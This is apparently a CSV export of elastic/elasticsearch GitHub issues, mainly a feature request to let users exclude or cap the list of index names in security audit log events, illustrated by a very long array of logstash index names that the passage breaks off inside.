  at java.lang.Thread.run(Thread.java:748)

```","Pinging @elastic/es-security (Team:Security)[Same error message](https://gradle-enterprise.elastic.co/s/oqvauyqk2min2/tests/:x-pack:plugin:security:test/org.elasticsearch.xpack.security.authc.ldap.LdapRealmTests/testAuthenticateCaching?top-execution=1) for a different test method. I suspect it is the same underlying reason.",no,">test-failure,:Security/Authentication,Team:Security,"
elastic/elasticsearch,536086424,"Option to exclude/cap index names from audit events","We currently provide options to [configure](https://www.elastic.co/guide/en/elasticsearch/reference/current/auditing-settings.html#node-audit-settings) whether or not to include things like host name, node name, etc.. in audit events.

This is a request to provide another configurable option for users to define whether or not they want to emit the entire list of index names when logging an audit event.

Use case:  Here is an audit log entry where the indices array shows 800+ indices for a single audit log entry.

```
""indices"":[""logstash-atl_metrics-2018.06.25"",""logstash-atl_metrics-2018.06.26"",""logstash-atl_metrics-2018.06.23"",""logstash-atl_metrics-2018.06.24"",""logstash-atl_metrics-2018.06.21"",""logstash-atl_metrics-2018.06.22"",""logstash-atl_metrics-2018.06.20"",""logstash-atl_metrics-2019.11.30"",""logstash-atl_metrics-2018.06.29"",""logstash-atl_metrics-2018.06.27"",""logstash-atl_metrics-2018.06.28"",""logstash-atl_metrics-2018.06.14"",""logstash-atl_metrics-2018.06.15"",""logstash-atl_metrics-2018.06.12"",""logstash-atl_metrics-2018.06.13"",""logstash-atl_metrics-2018.06.10"",""logstash-atl_metrics-2018.06.11"",""logstash-atl_metrics-2019.11.20"",""logstash-atl_metrics-2019.11.21"",""logstash-atl_metrics-2019.11.22"",""logstash-atl_metrics-2019.11.23"",""logstash-atl_metrics-2019.11.24"",""logstash-atl_metrics-2019.11.25"",""logstash-atl_metrics-2019.11.26"",""logstash-atl_metrics-2019.11.27"",""logstash-atl_metrics-2019.11.28"",""logstash-atl_metrics-2019.11.29"",""logstash-atl_metrics-2018.06.18"",""logstash-atl_metrics-2018.06.19"",""logstash-atl_metrics-2018.06.16"",""logstash-atl_metrics-2018.06.17"",""logstash-atl_metrics-2019.01.01"",""logstash-atl_metrics-2019.01.02"",""logstash-atl_metrics-2019.01.05"",""logstash-atl_metrics-2019.01.06"",""logstash-atl_metrics-2019.01.03"",""logstash-atl_metrics-2019.01.04"",""logstash-atl_metrics-2019.01.09"",""logstash-atl_metrics-2019.01.07"",""logstash-atl_metrics-2019.01.08"",""logstash-atl_metrics-2019.01.12"",""logstash-atl_metrics-2019.01.13"",""logstash-atl_metrics-2019.01.10"",""logstash-atl_metrics-2019.01.11"",""logstash-atl_metrics-2019.01.16"",""logstash-atl_metrics-2019.01.17"",""logstash-atl_metrics-2018.06.30"",""logstash-atl_metrics-2019.01.14"",""logstash-atl_metrics-2019.01.15"",""logstash-atl_metrics-2019.01.18"",""logstash-atl_metrics-2019.01.19"",""logstash-atl_metrics-2018.08.06"",""logstash-atl_metrics-2019.01.23"",""logstash-atl_metrics-2018.08.05"",""logstash-atl_metrics-2019.01.24"",""logstash-atl_metrics-2018.08.04"",""logstash-atl_metrics-2019.01.21"",""logstash-atl_metrics-2018.08.03"",""logstash-atl_metrics-2019.01.22"",""logstash-atl_metrics-2018.08.02"",""logstash-atl_metrics-2019.01.27"",""logstash-atl_metrics-2018.08.01"",""logstash-atl_metrics-2019.01.28"",""logstash-atl_metrics-2019.01.25"",""logstash-atl_metrics-2019.01.26"",""logstash-atl_metrics-2019.01.29"",""logstash-atl_metrics-2018.08.09"",""logstash-atl_metrics-2019.01.20"",""logstash-atl_metrics-2018.08.08"",""logstash-atl_metrics-2018.08.07"",""logstash-atl_metrics-2019.01.30"",""logstash-atl_metrics-2019.01.31"",""logstash-atl_metrics-2018.08.28"",""logstash-atl_metrics-2018.08.27"",""logstash-atl_metrics-2018.08.26"",""logstash-atl_metrics-2018.08.25"",""logstash-atl_metrics-2018.08.24"",""logstash-atl_metrics-2018.08.23"",""logstash-atl_metrics-2018.08.22"",""logstash-atl_metrics-2018.08.21"",""logstash-atl_metrics-2018.08.20"",""logstash-atl_metrics-2018.08.29"",""logstash-atl_metrics-2018.08.17"",""logstash-atl_metrics-2018.08.16"",""logstash-atl_metrics-2018.08.15"",""logstash-atl_metrics-2018.08.14"",""logstash-atl_metrics-2018.08.13"",""logstash-atl_metrics-2018.08.12"",""logstash-atl_metrics-2018.08.11"",""logstash-atl_metrics-2018.08.10"",""logstash-atl_metrics-2018.08.19"",""logstash-atl_metrics-2018.08.18"",""logstash-atl_metrics-2019.03.04"",""logstash-atl_metrics_v6-2017.12.16"",""logstash-atl_metrics-2019.03.03"",""logstash-atl_metrics_v6-2017.12.15"",""logstash-atl_metrics-2018.04.02"",""logstash-atl_metrics-2019.03.02"",""logstash-atl_metrics_v6-2017.12.14"",""logstash-atl_metrics-2018.04.01"",""logstash-atl_metrics-2019.03.01"",""logstash-atl_metrics_v6-2017.12.13"",""logstash-atl_metrics-2019.03.08"",""logstash-atl_metrics_v6-2017.12.12"",""logstash-atl_metrics-2019.03.07"",""logstash-atl_metrics_v6-2017.12.11"",""logstash-atl_metrics-2019.03.06"",""logstash-atl_metrics_v6-2017.12.10"",""logstash-atl_metrics-2019.03.05"",""logstash-atl_metrics-2019.03.09"",""logstash-atl_metrics_v6-2017.12.19"",""logstash-atl_metrics_v6-2017.12.18"",""logstash-atl_metrics_v6-2017.12.17"",""logstash-atl_metrics-2018.04.08"",""logstash-atl_metrics-2018.04.07"",""logstash-atl_metrics-2018.04.09"",""logstash-atl_metrics-2018.04.04"",""logstash-atl_metrics-2018.04.03"",""logstash-atl_metrics-2018.04.06"",""logstash-atl_metrics-2018.04.05"",""logstash-atl_metrics-2019.03.15"",""logstash-atl_metrics_v6-2017.12.05"",""logstash-atl_metrics-2019.03.14"",""logstash-atl_metrics_v6-2017.12.04"",""logstash-atl_metrics-2019.03.13"",""logstash-atl_metrics_v6-2017.12.03"",""logstash-atl_metrics-2019.03.12"",""logstash-atl_metrics_v6-2017.12.02"",""logstash-atl_metrics-2019.03.19"",""logstash-atl_metrics_v6-2017.12.01"",""logstash-atl_metrics-2019.03.18"",""logstash-atl_metrics-2019.03.17"",""logstash-atl_metrics-2019.03.16"",""logstash-atl_metrics_v6-2017.12.09"",""logstash-atl_metrics_v6-2017.12.08"",""logstash-atl_metrics_v6-2017.12.07"",""logstash-atl_metrics_v6-2017.12.06"",""logstash-atl_metrics-2019.03.11"",""logstash-atl_metrics-2019.03.10"",""logstash-atl_metrics-2018.04.22"",""logstash-atl_metrics-2019.03.26"",""logstash-atl_metrics-2018.04.21"",""logstash-atl_metrics-2019.03.25"",""logstash-atl_metrics-2018.04.24"",""logstash-atl_metrics-2019.03.24"",""logstash-atl_metrics-2018.04.23"",""logstash-atl_metrics-2019.03.23"",""logstash-atl_metrics-2019.03.29"",""logstash-atl_metrics-2018.04.20"",""logstash-atl_metrics-2019.03.28"",""logstash-atl_metrics-2019.03.27"",""logstash-atl_metrics_v6-2017.12.31"",""logstash-atl_metrics_v6-2017.12.30"",""logstash-atl_metrics-2018.04.29"",""logstash-atl_metrics-2018.04.26"",""logstash-atl_metrics-2019.03.22"",""logstash-atl_metrics-2018.04.25"",""logstash-atl_metrics-2019.03.21"",""logstash-atl_metrics-2018.04.28"",""logstash-atl_metrics-2019.03.20"",""logstash-atl_metrics-2018.04.27"",""logstash-atl_metrics-2018.04.11"",""logstash-atl_metrics_v6-2017.12.27"",""logstash-atl_metrics-2018.04.10"",""logstash-atl_metrics_v6-2017.12.26"",""logstash-atl_metrics-2018.04.13"",""logstash-atl_metrics_v6-2017.12.25"",""logstash-atl_metrics-2018.04.12"",""logstash-atl_metrics_v6-2017.12.24"",""logstash-atl_metrics_v6-2017.12.23"",""logstash-atl_metrics_v6-2017.12.22"",""logstash-atl_metrics_v6-2017.12.21"",""logstash-atl_metrics_v6-2017.12.20"",""logstash-atl_metrics_v6-2017.12.29"",""logstash-atl_metrics_v6-2017.12.28"",""logstash-atl_metrics_v6-2018.01.09"",""logstash-atl_metrics_v6-2018.01.08"",""logstash-atl_metrics_v6-2018.01.07"",""logstash-atl_metrics_v6-2018.01.06"",""logstash-atl_metrics_v6-2018.01.05"",""logstash-atl_metrics-2018.04.19"",""logstash-atl_metrics_v6-2018.01.04"",""logstash-atl_metrics-2018.04.18"",""logstash-atl_metrics_v6-2018.01.03"",""logstash-atl_metrics_v6-2018.01.02"",""logstash-atl_metrics_v6-2018.01.01"",""logstash-atl_metrics-2018.04.15"",""logstash-atl_metrics-2018.04.14"",""logstash-atl_metrics-2018.04.17"",""logstash-atl_metrics-2019.03.31"",""logstash-atl_metrics-2018.04.16"",""logstash-atl_metrics-2019.03.30"",""logstash-atl_metrics_v6-2018.01.19"",""logstash-atl_metrics_v6-2018.01.18"",""logstash-atl_metrics_v6-2018.01.17"",""logstash-atl_metrics_v6-2018.01.16"",""logstash-atl_metrics_v6-2018.01.15"",""logstash-atl_metrics_v6-2018.01.14"",""logstash-atl_metrics_v6-2018.01.13"",""logstash-atl_metrics_v6-2018.01.12"",""logstash-atl_metrics_v6-2018.01.11"",""logstash-atl_metrics_v6-2018.01.10"",""logstash-atl_metrics-2018.04.30"",""logstash-atl_metrics_v6-2018.01.29"",""logstash-atl_metrics_v6-2018.01.28"",""logstash-atl_metrics_v6-2018.01.27"",""logstash-atl_metrics_v6-2018.01.26"",""logstash-atl_metrics_v6-2018.01.25"",""logstash-atl_metrics_v6-2018.01.24"",""logstash-atl_metrics_v6-2018.01.23"",""logstash-atl_metrics_v6-2018.01.22"",""logstash-atl_metrics_v6-2018.01.21"",""logstash-atl_metrics_v6-2018.01.20"",""logstash-atl_metrics-2018.06.03"",""logstash-atl_metrics-2019.05.06"",""logstash-atl_metrics-2018.06.04"",""logstash-atl_metrics-2019.05.05"",""logstash-atl_metrics-2018.06.01"",""logstash-atl_metrics-2019.05.04"",""logstash-atl_metrics-2018.06.02"",""logstash-atl_metrics-2019.05.03"",""logstash-atl_metrics-2019.05.09"",""logstash-atl_metrics-2019.05.08"",""logstash-atl_metrics-2019.05.07"",""logstash-atl_metrics-2018.06.09"",""logstash-atl_metrics-2018.06.07"",""logstash-atl_metrics-2019.05.02"",""logstash-atl_metrics-2018.06.08"",""logstash-atl_metrics-2019.05.01"",""logstash-atl_metrics-2018.06.05"",""logstash-atl_metrics_v6-2018.01.31"",""logstash-atl_metrics-2018.06.06"",""logstash-atl_metrics_v6-2018.01.30"",""logstash-atl_metrics-2019.05.17"",""logstash-atl_metrics-2019.05.16"",""logstash-atl_metrics-2019.05.15"",""logstash-atl_metrics-2019.05.14"",""logstash-atl_metrics-2019.05.19"",""logstash-atl_metrics-2019.05.18"",""logstash-atl_metrics-2019.05.13"",""logstash-atl_metrics-2019.05.12"",""logstash-atl_metrics-2019.05.11"",""logstash-atl_metrics-2019.05.10"",""logstash-atl_metrics_v6-2017.09.02"",""logstash-atl_metrics_v6-2017.09.03"",""logstash-atl_metrics_v6-2017.09.04"",""logstash-atl_metrics_v6-2017.09.05"",""logstash-atl_metrics_v6-2017.09.01"",""logstash-atl_metrics_v6-2017.09.06"",""logstash-atl_metrics_v6-2017.09.07"",""logstash-atl_metrics_v6-2017.09.08"",""logstash-atl_metrics_v6-2017.09.09"",""logstash-atl_metrics-2019.06.08"",""logstash-atl_metrics-2019.06.09"",""logstash-atl_metrics-2019.06.04"",""logstash-atl_metrics-2019.06.05"",""logstash-atl_metrics-2019.06.06"",""logstash-atl_metrics-2019.06.07"",""logstash-atl_metrics-2019.06.01"",""logstash-atl_metrics-2019.06.02"",""logstash-atl_metrics-2019.06.03"",""logstash-atl_metrics-2019.06.19"",""logstash-atl_metrics_v6-2017.09.24"",""logstash-atl_metrics_v6-2017.10.13"",""logstash-atl_metrics_v6-2017.09.25"",""logstash-atl_metrics_v6-2017.10.14"",""logstash-atl_metrics_v6-2017.09.26"",""logstash-atl_metrics_v6-2017.10.11"",""logstash-atl_metrics_v6-2017.09.27"",""logstash-atl_metrics_v6-2017.10.12"",""logstash-atl_metrics-2019.06.15"",""logstash-atl_metrics_v6-2017.09.20"",""logstash-atl_metrics-2019.06.16"",""logstash-atl_metrics_v6-2017.09.21"",""logstash-atl_metrics_v6-2017.10.10"",""logstash-atl_metrics-2019.06.17"",""logstash-atl_metrics_v6-2017.09.22"",""logstash-atl_metrics-2019.06.18"",""logstash-atl_metrics_v6-2017.09.23"",""logstash-atl_metrics_v6-2017.10.19"",""logstash-atl_metrics_v6-2017.10.17"",""logstash-atl_metrics_v6-2017.10.18"",""logstash-atl_metrics_v6-2017.10.15"",""logstash-atl_metrics_v6-2017.10.16"",""logstash-atl_metrics-2019.06.11"",""logstash-atl_metrics-2019.06.12"",""logstash-atl_metrics-2019.06.13"",""logstash-atl_metrics-2019.06.14"",""logstash-atl_metrics_v6-2017.09.28"",""logstash-atl_metrics_v6-2017.09.29"",""logstash-atl_metrics-2019.06.10"",""logstash-atl_metrics_v6-2017.09.13"",""logstash-atl_metrics_v6-2017.10.02"",""logstash-atl_metrics_v6-2017.09.14"",""logstash-atl_metrics_v6-2017.10.03"",""logstash-atl_metrics_v6-2017.09.15"",""logstash-atl_metrics_v6-2017.09.16"",""logstash-atl_metrics_v6-2017.10.01"",""logstash-atl_metrics-2019.06.26"",""logstash-atl_metrics-2019.06.27"",""logstash-atl_metrics_v6-2017.09.10"",""logstash-atl_metrics-2019.06.28"",""logstash-atl_metrics_v6-2017.09.11"",""logstash-atl_metrics-2019.06.29"",""logstash-atl_metrics_v6-2017.09.12"",""logstash-atl_metrics_v6-2017.10.08"",""logstash-atl_metrics_v6-2017.10.09"",""logstash-atl_metrics_v6-2017.10.06"",""logstash-atl_metrics_v6-2017.10.07"",""logstash-atl_metrics_v6-2017.10.04"",""logstash-atl_metrics_v6-2017.10.05"",""logstash-atl_metrics-2019.06.22"",""logstash-atl_metrics-2019.06.23"",""logstash-atl_metrics-2019.06.24"",""logstash-atl_metrics-2019.06.25"",""logstash-atl_metrics_v6-2017.09.17"",""logstash-atl_metrics_v6-2017.09.18"",""logstash-atl_metrics-2019.06.20"",""logstash-atl_metrics_v6-2017.09.19"",""logstash-atl_metrics-2019.06.21"",""logstash-atl_metrics_v6-2017.10.31"",""logstash-atl_metrics_v6-2017.10.30"",""logstash-atl_metrics-2019.06.30"",""logstash-atl_metrics_v6-2017.10.24"",""logstash-atl_metrics_v6-2017.10.25"",""logstash-atl_metrics_v6-2017.10.22"",""logstash-atl_metrics_v6-2017.10.23"",""logstash-atl_metrics_v6-2017.10.20"",""logstash-atl_metrics_v6-2017.10.21"",""logstash-atl_metrics_v6-2017.09.30"",""logstash-atl_metrics_v6-2017.10.28"",""logstash-atl_metrics_v6-2017.10.29"",""logstash-atl_metrics_v6-2017.10.26"",""logstash-atl_metrics_v6-2017.10.27"",""logstash-atl_metrics-2018.03.10"",""logstash-atl_metrics-2018.03.11"",""logstash-atl_metrics-2018.03.12"",""logstash-atl_metrics-2018.03.17"",""logstash-atl_metrics-2018.03.18"",""logstash-atl_metrics-2018.03.19"",""logstash-atl_metrics-2018.03.13"",""logstash-atl_metrics-2018.03.14"",""logstash-atl_metrics-2018.03.15"",""logstash-atl_metrics-2018.03.16"",""logstash-atl_metrics-2018.03.01"",""logstash-atl_metrics-2019.08.07"",""logstash-atl_metrics-2019.08.06"",""logstash-atl_metrics-2019.08.09"",""logstash-atl_metrics-2019.08.08"",""logstash-atl_metrics-2018.03.06"",""logstash-atl_metrics-2019.08.03"",""logstash-atl_metrics-2018.03.07"",""logstash-atl_metrics-2019.08.02"",""logstash-atl_metrics-2018.03.08"",""logstash-atl_metrics-2019.08.05"",""logstash-atl_metrics-2018.03.09"",""logstash-atl_metrics-2019.08.04"",""logstash-atl_metrics-2018.03.02"",""logstash-atl_metrics-2018.03.03"",""logstash-atl_metrics-2018.03.04"",""logstash-atl_metrics-2019.08.01"",""logstash-atl_metrics-2018.03.05"",""logstash-atl_metrics-2019.08.18"",""logstash-atl_metrics-2019.08.17"",""logstash-atl_metrics-2019.08.19"",""logstash-atl_metrics-2019.08.14"",""logstash-atl_metrics-2019.08.13"",""logstash-atl_metrics-2019.08.16"",""logstash-atl_metrics-2019.08.15"",""logstash-atl_metrics-2019.08.10"",""logstash-atl_metrics-2019.08.12"",""logstash-atl_metrics-2019.08.11"",""logstash-atl_metrics-2019.08.29"",""logstash-atl_metrics-2019.08.28"",""logstash-atl_metrics-2018.08.31"",""logstash-atl_metrics-2018.08.30"",""logstash-atl_metrics-2019.08.25"",""logstash-atl_metrics-2019.08.24"",""logstash-atl_metrics-2019.08.27"",""logstash-atl_metrics-2019.08.26"",""logstash-atl_metrics-2019.08.21"",""logstash-atl_metrics-2019.08.20"",""logstash-atl_metrics-2019.08.23"",""logstash-atl_metrics-2019.08.22"",""logstash-atl_metrics-2019.08.30"",""logstash-atl_metrics-2019.08.31"",""logstash-atl_metrics-2018.11.19"",""logstash-atl_metrics-2018.11.18"",""logstash-atl_metrics-2018.11.11"",""logstash-atl_metrics-2018.11.10"",""logstash-atl_metrics-2018.11.13"",""logstash-atl_metrics-2018.11.12"",""logstash-atl_metrics-2018.11.15"",""logstash-atl_metrics-2018.11.14"",""logstash-atl_metrics-2018.11.17"",""logstash-atl_metrics-2018.11.16"",""logstash-atl_metrics-2018.11.08"",""logstash-atl_metrics-2018.11.07"",""logstash-atl_metrics-2018.11.09"",""logstash-atl_metrics-2018.11.02"",""logstash-atl_metrics-2018.11.01"",""logstash-atl_metrics-2018.11.04"",""logstash-atl_metrics-2018.11.03"",""logstash-atl_metrics-2018.11.06"",""logstash-atl_metrics-2018.11.05"",""logstash-atl_metrics-2019.11.10"",""logstash-atl_metrics-2019.11.11"",""logstash-atl_metrics-2019.11.12"",""logstash-atl_metrics-2019.11.13"",""logstash-atl_metrics-2019.11.14"",""logstash-atl_metrics-2019.11.15"",""logstash-atl_metrics-2018.11.30"",""logstash-atl_metrics-2019.11.16"",""logstash-atl_metrics-2019.11.17"",""logstash-atl_metrics-2019.11.18"",""logstash-atl_metrics-2019.11.19"",""logstash-atl_metrics-2018.11.29"",""logstash-atl_metrics-2018.11.22"",""logstash-atl_metrics-2018.11.21"",""logstash-atl_metrics-2018.11.24"",""logstash-atl_metrics-2018.11.23"",""logstash-atl_metrics-2018.11.26"",""logstash-atl_metrics-2018.11.25"",""logstash-atl_metrics-2018.11.28"",""logstash-atl_metrics-2018.11.27"",""logstash-atl_metrics-2019.11.01"",""logstash-atl_metrics-2019.11.02"",""logstash-atl_metrics-2019.11.03"",""logstash-atl_metrics-2018.11.20"",""logstash-atl_metrics-2019.11.04"",""logstash-atl_metrics-2019.11.05"",""logstash-atl_metrics-2019.11.06"",""logstash-atl_metrics-2019.11.07"",""logstash-atl_metrics-2019.11.08"",""logstash-atl_metrics-2019.11.09"",""logstash-atl_metrics-2019.12.01"",""logstash-atl_metrics-2019.12.02"",""logstash-atl_metrics-2019.12.03"",""logstash-atl_metrics-2019.12.04"",""logstash-atl_metrics-2019.12.05"",""logstash-atl_metrics-2019.12.06"",""logstash-atl_metrics-2018.07.15"",""logstash-atl_metrics-2018.07.16"",""logstash-atl_metrics-2018.07.13"",""logstash-atl_metrics-2018.07.14"",""logstash-atl_metrics-2018.07.11"",""logstash-atl_metrics-2018.07.12"",""logstash-atl_metrics-2018.07.10"",""logstash-atl_metrics-2018.07.19"",""logstash-atl_metrics-2018.07.17"",""logstash-atl_metrics-2018.07.18"",""logstash-atl_metrics-2018.07.04"",""logstash-atl_metrics-2018.07.05"",""logstash-atl_metrics-2018.07.02"",""logstash-atl_metrics-2018.07.03"",""logstash-atl_metrics-2018.07.01"",""logstash-atl_metrics-2018.07.08"",""logstash-atl_metrics-2018.07.09"",""logstash-atl_metrics-2018.07.06"",""logstash-atl_metrics-2018.07.07"",""logstash-atl_metrics-2018.07.31"",""logstash-atl_metrics-2018.07.30"",""logstash-atl_metrics-2018.07.26"",""logstash-atl_metrics-2018.07.27"",""logstash-atl_metrics-2019.02.03"",""logstash-atl_metrics-2018.07.24"",""logstash-atl_metrics-2019.02.01"",""logstash-atl_metrics-2018.07.22"",""logstash-atl_metrics-2019.02.06"",""logstash-atl_metrics-2018.07.23"",""logstash-atl_metrics-2019.02.07"",""logstash-atl_metrics-2018.07.20"",""logstash-atl_metrics-2019.02.04"",""logstash-atl_metrics-2018.07.21"",""logstash-atl_metrics-2019.02.05"",""logstash-atl_metrics-2019.02.08"",""logstash-atl_metrics-2019.02.09"",""logstash-atl_metrics-2018.07.28"",""logstash-atl_metrics-2018.07.29"",""logstash-atl_metrics-2019.02.13"",""logstash-atl_metrics-2019.02.14"",""logstash-atl_metrics-2019.02.11"",""logstash-atl_metrics-2019.02.12"",""logstash-atl_metrics-2019.02.17"",""logstash-atl_metrics-2019.02.18"",""logstash-atl_metrics-2019.02.15"",""logstash-atl_metrics-2019.02.16"",""logstash-atl_metrics-2019.02.19"",""logstash-atl_metrics-2019.02.10"",""logstash-atl_metrics-2019.02.24"",""logstash-atl_metrics-2019.02.25"",""logstash-atl_metrics-2019.02.22"",""logstash-atl_metrics-2019.02.23"",""logstash-atl_metrics-2019.02.28"",""logstash-atl_metrics-2019.02.26"",""logstash-atl_metrics-2019.02.27"",""logstash-atl_metrics-2019.02.20"",""logstash-atl_metrics-2019.02.21"",""logstash-atl_metrics-2018.03.31"",""logstash-atl_metrics-2018.03.30"",""logstash-atl_metrics-2018.03.20"",""logstash-atl_metrics-2018.03.21"",""logstash-atl_metrics-2018.03.22"",""logstash-atl_metrics-2018.03.23"",""logstash-atl_metrics_v6-2017.11.30"",""logstash-atl_metrics-2018.03.28"",""logstash-atl_metrics-2018.03.29"",""logstash-atl_metrics-2018.03.24"",""logstash-atl_metrics-2018.03.25"",""logstash-atl_metrics-2018.03.26"",""logstash-atl_metrics-2018.03.27"",""logstash-atl_metrics-2019.04.05"",""logstash-atl_metrics-2019.04.04"",""logstash-atl_metrics-2019.04.03"",""logstash-atl_metrics-2019.04.02"",""logstash-atl_metrics-2019.04.09"",""logstash-atl_metrics-2019.04.08"",""logstash-atl_metrics-2019.04.07"",""logstash-atl_metrics-2019.04.06"",""logstash-atl_metrics-2019.04.01"",""logstash-atl_metrics-2018.05.12"",""logstash-atl_metrics-2019.04.16"",""logstash-atl_metrics-2018.05.11"",""logstash-atl_metrics-2019.04.15"",""logstash-atl_metrics-2018.05.14"",""logstash-atl_metrics-2019.04.14"",""logstash-atl_metrics-2018.05.13"",""logstash-atl_metrics-2019.04.13"",""logstash-atl_metrics-2019.04.19"",""logstash-atl_metrics-2018.05.10"",""logstash-atl_metrics-2019.04.18"",""logstash-atl_metrics-2019.04.17"",""logstash-atl_metrics-2018.05.19"",""logstash-atl_metrics-2018.05.16"",""logstash-atl_metrics-2019.04.12"",""logstash-atl_metrics-2018.05.15"",""logstash-atl_metrics-2019.04.11"",""logstash-atl_metrics-2018.05.18"",""logstash-atl_metrics-2019.04.10"",""logstash-atl_metrics-2018.05.17"",""logstash-atl_metrics-2018.05.01"",""logstash-atl_metrics-2019.04.27"",""logstash-atl_metrics-2019.04.26"",""logstash-atl_metrics-2018.05.03"",""logstash-atl_metrics-2019.04.25"",""logstash-atl_metrics-2018.05.02"",""logstash-atl_metrics-2019.04.24"",""logstash-atl_metrics-2019.04.29"",""logstash-atl_metrics-2019.04.28"",""logstash-atl_metrics-2018.05.09"",""logstash-atl_metrics-2018.05.08"",""logstash-atl_metrics-2018.05.05"",""logstash-atl_metrics-2019.04.23"",""logstash-atl_metrics-2018.05.04"",""logstash-atl_metrics-2019.04.22"",""logstash-atl_metrics-2018.05.07"",""logstash-atl_metrics-2019.04.21"",""logstash-atl_metrics-2018.05.06"",""logstash-atl_metrics-2019.04.20"",""logstash-atl_metrics-2018.05.30"",""logstash-atl_metrics-2018.05.31"",""logstash-atl_metrics-2019.04.30"",""logstash-atl_metrics_v6-2018.02.02"",""logstash-atl_metrics_v6-2018.02.01"",""logstash-atl_metrics-2018.05.23"",""logstash-atl_metrics-2018.05.22"",""logstash-atl_metrics-2018.05.25"",""logstash-atl_metrics-2018.05.24"",""logstash-atl_metrics-2018.05.21"",""logstash-atl_metrics-2018.05.20"",""logstash-atl_metrics-2018.05.27"",""logstash-atl_metrics-2018.05.26"",""logstash-atl_metrics-2018.05.29"",""logstash-atl_metrics-2018.05.28"",""logstash-atl_metrics-2019.05.28"",""logstash-atl_metrics-2019.05.27"",""logstash-atl_metrics-2019.05.26"",""logstash-atl_metrics-2019.05.25"",""logstash-atl_metrics_v6-2017.08.30"",""logstash-atl_metrics_v6-2017.08.31"",""logstash-atl_metrics-2019.05.29"",""logstash-atl_metrics-2018.12.24"",""logstash-atl_metrics-2018.12.25"",""logstash-atl_metrics-2018.12.22"",""logstash-atl_metrics-2018.12.23"",""logstash-atl_metrics-2018.12.28"",""logstash-atl_metrics-2018.12.29"",""logstash-atl_metrics-2018.12.26"",""logstash-atl_metrics-2018.12.27"",""logstash-atl_metrics-2018.12.20"",""logstash-atl_metrics-2018.12.21"",""logstash-atl_metrics-2019.05.20"",""logstash-atl_metrics-2019.05.24"",""logstash-atl_metrics-2019.05.23"",""logstash-atl_metrics-2019.05.22"",""logstash-atl_metrics-2019.05.21"",""logstash-atl_metrics_v6-2017.08.23"",""logstash-atl_metrics_v6-2017.08.24"",""logstash-atl_metrics-2018.12.19"",""logstash-atl_metrics_v6-2017.08.25"",""logstash-atl_metrics_v6-2017.08.26"",""logstash-atl_metrics_v6-2017.08.20"",""logstash-atl_metrics_v6-2017.08.21"",""logstash-atl_metrics_v6-2017.08.22"",""logstash-atl_metrics-2018.12.13"",""logstash-atl_metrics-2018.12.14"",""logstash-atl_metrics-2018.12.11"",""logstash-atl_metrics-2018.12.12"",""logstash-atl_metrics-2018.12.17"",""logstash-atl_metrics-2018.12.18"",""logstash-atl_metrics-2018.12.15"",""logstash-atl_metrics-2018.12.16"",""logstash-atl_metrics-2018.12.10"",""logstash-atl_metrics-2019.05.31"",""logstash-atl_metrics-2019.05.30"",""logstash-atl_metrics_v6-2017.08.27"",""logstash-atl_metrics_v6-2017.08.28"",""logstash-atl_metrics_v6-2017.08.29"",""logstash-atl_metrics-2018.02.09"",""logstash-atl_metrics-2018.02.05"",""logstash-atl_metrics-2018.02.06"",""logstash-atl_metrics-2018.02.07"",""logstash-atl_metrics-2018.02.08"",""logstash-atl_metrics-2018.02.03"",""logstash-atl_metrics-2018.02.04"",""logstash-atl_metrics-2018.12.31"",""logstash-atl_metrics-2018.12.30"",""logstash-atl_metrics-2019.07.09"",""logstash-atl_metrics_v6-2017.11.04"",""logstash-atl_metrics-2018.02.20"",""logstash-atl_metrics_v6-2017.11.03"",""logstash-atl_metrics-2018.02.21"",""logstash-atl_metrics_v6-2017.11.02"",""logstash-atl_metrics-2018.02.22"",""logstash-atl_metrics_v6-2017.11.01"",""logstash-atl_metrics-2019.07.05"",""logstash-atl_metrics-2019.07.06"",""logstash-atl_metrics-2019.07.07"",""logstash-atl_metrics-2019.07.08"",""logstash-atl_metrics_v6-2017.11.09"",""logstash-atl_metrics_v6-2017.11.08"",""logstash-atl_metrics_v6-2017.11.07"",""logstash-atl_metrics_v6-2017.11.06"",""logstash-atl_metrics_v6-2017.11.05"",""logstash-atl_metrics-2018.02.27"",""logstash-atl_metrics-2019.07.01"",""logstash-atl_metrics-2018.02.28"",""logstash-atl_metrics-2019.07.02"",""logstash-atl_metrics-2019.07.03"",""logstash-atl_metrics-2019.07.04"",""logstash-atl_metrics-2018.02.23"",""logstash-atl_metrics-2018.02.24"",""logstash-atl_metrics-2018.02.25"",""logstash-atl_metrics-2018.02.26"",""logstash-atl_metrics-2018.02.10"",""logstash-atl_metrics-2018.02.11"",""logstash-atl_metrics-2019.07.16"",""logstash-atl_metrics-2019.07.17"",""logstash-atl_metrics-2019.07.18"",""logstash-atl_metrics-2019.07.19"",""logstash-atl_metrics-2018.02.16"",""logstash-atl_metrics-2018.02.17"",""logstash-atl_metrics-2018.02.18"",""logstash-atl_metrics-2018.02.19"",""logstash-atl_metrics-2018.02.12"",""logstash-atl_metrics-2018.02.13"",""logstash-atl_metrics-2018.02.14"",""logstash-atl_metrics-2019.07.10"",""logstash-atl_metrics-2018.02.15"",""logstash-atl_metrics-2019.07.11"",""logstash-atl_metrics_v6-2017.11.26"",""logstash-atl_metrics_v6-2017.11.25"",""logstash-atl_metrics_v6-2017.11.24"",""logstash-atl_metrics_v6-2017.11.23"",""logstash-atl_metrics-2019.07.27"",""logstash-atl_metrics_v6-2017.11.22"",""logstash-atl_metrics-2019.07.28"",""logstash-atl_metrics_v6-2017.11.21"",""logstash-atl_metrics-2019.07.29"",""logstash-atl_metrics_v6-2017.11.20"",""logstash-atl_metrics_v6-2017.11.29"",""logstash-atl_metrics_v6-2017.11.28"",""logstash-atl_metrics_v6-2017.11.27"",""logstash-atl_metrics-2019.07.23"",""logstash-atl_metrics-2019.07.24"",""logstash-atl_metrics-2019.07.25"",""logstash-atl_metrics-2019.07.26"",""logstash-atl_metrics-2019.07.20"",""logstash-atl_metrics-2019.07.21"",""logstash-atl_metrics-2019.07.22"",""logstash-atl_metrics_v6-2017.11.15"",""logstash-atl_metrics_v6-2017.11.14"",""logstash-atl_metrics_v6-2017.11.13"",""logstash-atl_metrics_v6-2017.11.12"",""logstash-atl_metrics_v6-2017.11.11"",""logstash-atl_metrics_v6-2017.11.10"",""logstash-atl_metrics_v6-2017.11.19"",""logstash-atl_metrics_v6-2017.11.18"",""logstash-atl_metrics_v6-2017.11.17"",""logstash-atl_metrics_v6-2017.11.16"",""logstash-atl_metrics-2019.07.30"",""logstash-atl_metrics-2019.07.31"",""logstash-atl_metrics-2018.09.18"",""logstash-atl_metrics-2018.10.07"",""logstash-atl_metrics-2018.09.17"",""logstash-atl_metrics